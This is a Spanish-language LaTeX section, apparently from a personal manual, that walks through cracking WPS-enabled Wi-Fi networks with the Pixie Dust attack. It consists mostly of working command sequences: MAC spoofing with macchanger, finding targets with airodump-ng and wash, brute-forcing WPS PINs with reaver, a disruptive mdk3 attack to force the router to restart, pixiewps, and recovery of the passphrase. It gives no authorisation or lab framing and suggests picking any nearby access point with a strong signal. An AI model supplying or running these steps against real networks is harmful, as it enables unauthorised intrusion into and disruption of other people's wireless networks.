\section{Cracking de redes wireless con WPS activado}\label{sec:crack-wps}
% -------------------------------------------------------------------------------------------------------------
El mejor tutorial que he encontrado hasta la fecha es el que se encuentra en
\url{https://www.youtube.com/watch?v=FiuKaXIaCNQ}. Usa varios programas en línea de comandos que aprovechan una
vulnerabilidad que se encontró al estándar WPS. En concreto, aquí se explicará un ataque de este tipo llamado
\foreignlanguage{english}{Pixie Dust}. Antes, funcionaba muy bien, pero los fabricantes de routers han ido
actualizándolos para que sea más difícil un ataque de este tipo. Por ejemplo, tras varios intentos seguidos muy
rápidos de petición de WPS, se bloquea el WPS durante \SI{60}{\sec}. Otra forma, más complicada, de crackear
redes wifi con seguridad WPA o WPA2 es extrayendo el hash de una passphrase de WPA o WPA2 y haciendo un ataque
de fuerza bruta. Este último método es mucho más complicado, puesto que las passphrases de los AP wireless
suelen ser complejas, puesto que las preconfigura el ISP al entregar el router al cliente, y, si éste la cambia,
es que sabe más o menos cómo crear una clave fuerte, así que un diccionario para hacér más fácil el ataque es
inútil aquí.

Así, pues, como acabo de explicar, la mejor forma que he encontrado de crackear una red wifi aprovechando que
no tenga bloqueado el WPS es del modo siguiente. Estoy suponiendo que usted tiene instalada una distribución de
Linux con el software necesario para el crackeo de wifi. Puede hacerlo instalando Kali Linux o cualquier otra
distribución con tal de que le pueda instalar las herramientas de software necesarias, que se usan aquí. También
puede ejecutarla como Live-CD (ya sea, en CD, DVD, pendrive, etc.) o en una máquina virtual.

Lo primero es comprobar sus interfaces wifi:

\begin{lstlisting}[gobble=2,language=bash,style=bashinteract,escapechar=!]
  !\promptr! @@ifconfig -a@@
\end{lstlisting}

\noindent También, con:

\begin{lstlisting}[gobble=2,language=bash,style=bashinteract,escapechar=!]
  !\promptr! @@iwconfig@@
\end{lstlisting}

Ahora deberá ver qué interfaces son aptas para usarlas con Airmon-ng:

\begin{lstlisting}[gobble=2,language=bash,style=bashinteract,escapechar=!]
  !\promptr! @@airmon-ng@@
\end{lstlisting}

Ahora ponga en down la interfaz que desea usar para realizar el ataque, en este caso, será \val{nic\_att}:

\begin{lstlisting}[gobble=2,language=bash,style=bashinteract,escapechar=!]
  !\promptr! @@ifconfig !\val{nic\_att}! down@@
\end{lstlisting}

Ahora matará algunos procesos que pueden entorpecer el comando que va después:

\begin{lstlisting}[gobble=2,language=bash,style=bashinteract,escapechar=!]
  !\promptr! @@airmon-ng check kill@@
\end{lstlisting}

Ahora, ejecutará el comando \lstinline!airmon-ng! sobre \val{nic\_att}:

\begin{lstlisting}[gobble=2,language=bash,style=bashinteract,escapechar=!]
  !\promptr! @@airmon-ng start !\val{nic\_att}!@@
\end{lstlisting}

Ahora vea de nuevo su interfaz wifi:

\begin{lstlisting}[gobble=2,language=bash,style=bashinteract,escapechar=!]
  !\promptr! @@iwconfig@@
\end{lstlisting}

Ahora cambiará la dirección MAC de su interfaz (hará lo que se conoce como MAC spoofing) y pasará su interfaz a
modo monitor. El MAC spoofing no sé si es necesario en este caso, pues creo que el comando \lstinline!airmon-ng!
le hace ``invisible'', y pasar al modo monitor, según algunos tutoriales, es algo que debería hacer el comando
\lstinline!airmon-ng!. Aun así, aquí se hará explícitamente por si acaso:

\begin{lstlisting}[gobble=2,language=bash,style=bashinteract,escapechar=!]
  !\promptr! @@ifconfig !\val{nic\_att\_mon}! down@@
  !\promptr! @@macchanger -r !\val{nic\_att\_mon}!@@
  !\promptr! @@iwconfig !\val{nic\_att\_mon}! mode monitor@@
  !\promptr! @@ifconfig !\val{nic\_att\_mon}! up@@
\end{lstlisting}

Ahora abra dos pestañas de terminal, en cada una de las cuales ejecutará un comando. El primero será para ver
las redes wifi de las que recibe señal y la potencia de las mismas en \si{\deci\bel m}:

\begin{lstlisting}[gobble=2,language=bash,style=bashinteract,escapechar=!]
  !\promptr! @@airodump-ng -i !\val{nic\_att\_mon}!@@
\end{lstlisting}

En la otra, deberá mostrar (es preferible en otro terminal) las redes de las que recibe señal y si tienen
bloqueado el WPS:

\begin{lstlisting}[gobble=2,language=bash,style=bashinteract,escapechar=!]
  !\promptr! @@wash -i !\val{nic\_att\_mon}! -C@@
\end{lstlisting}

Seleccione una de la que usted reciba una señal lo bastante potente (\si{\deci\bel m}) y apunte su ESSID, su
canal y su BSSID (la dirección MAC del router); fíjese también en que bajo la columna \lstinline!WPS locked!
pone \lstinline!no!.

Ahora introduzca el siguiente comando para que su sistema comience a probar PINs:

\begin{lstlisting}[gobble=2,language=bash,style=bashinteract,escapechar=!]
  !\promptr! @@reaver -i !\val{nic\_att\_mon}! -vv -S -b !\val{bssid\_ap}! -c !\val{canal\_ap}!@@
\end{lstlisting}

Hay veces que funciona mejor añadiéndole la opción \lstinline!-w!:

\begin{lstlisting}[gobble=2,language=bash,style=bashinteract,escapechar=!]
  !\promptr! @@reaver -i !\val{nic\_att\_mon}! -vv -S -b !\val{bssid\_ap}! -c !\val{canal\_ap}! -w@@
\end{lstlisting}

Puede tardar mucho tiempo. Debe tener en cuenta que no le aparecen errores como, por ejemplo, los que tienen
código 0x02 o 0x03, que hacen que se repita el intento de PIN porque la señal no le llega a usted con la
suficiente potencia. Advierta que si reintenta siempre el mismo PIN le trae más a cuenta probar con otro punto
de acceso.

Otra cosa que puede hacer cuando no le funciona bien el ataque es un ataque mdk3 hasta que el router cambie de
canal o se reinicie:

\begin{lstlisting}[gobble=2,language=bash,style=bashinteract,escapechar=!]
  !\promptr! @@mdk3 !\val{nic\_att\_mon}! a -a !\val{bssid\_ap}! -m@@
\end{lstlisting}

Luego vuelva a lanzar el ataque reaver.

Otra cosa, más evidente, que puede hacer es aumentar la potencia de Tx, si se lo permite su NIC, o usar una
NIC con mayor recepción (\si{\deci\bel i}, decibelios isotrópicos).

Para hacer el ataque Pixie Dust, basta con que vea que ha obtenido los valores de \val{pke}, \val{pkr},
\val{e-hash1}, \val{e-hash2}, \val{authkey} y \val{e-nonce}.

Ahora, en otra ventana del emulador de terminal, ejecute:

\begin{lstlisting}[gobble=2,language=bash,style=bashinteract,escapechar=!]
  !\promptr! @@pixiewps -e !\val{pke}! -r !\val{pkr}! -s !\val{e-hash1}! \ @@
  > @@-z !\val{e-hash2}! -a !\val{authkey}! -n !\val{e-nonce}!@@
\end{lstlisting}

Esto, si se lo permite el punto de acceso que está atacando, debería devolverle el PIN de WPS de dicho punto
de acceso. Con dicho PIN puede obtenerse la pashphrase del punto de acceso. Para eso deberá introducir:

\begin{lstlisting}[gobble=2,language=bash,style=bashinteract,escapechar=!]
  !\promptr! @@reaver -i !\val{nic\_val\_mon}! -vv -S -b !\val{bssid\_ap}! \ @@
  > @@-c !\val{canal\_ap}! --pin=!\val{pin}!@@
\end{lstlisting}
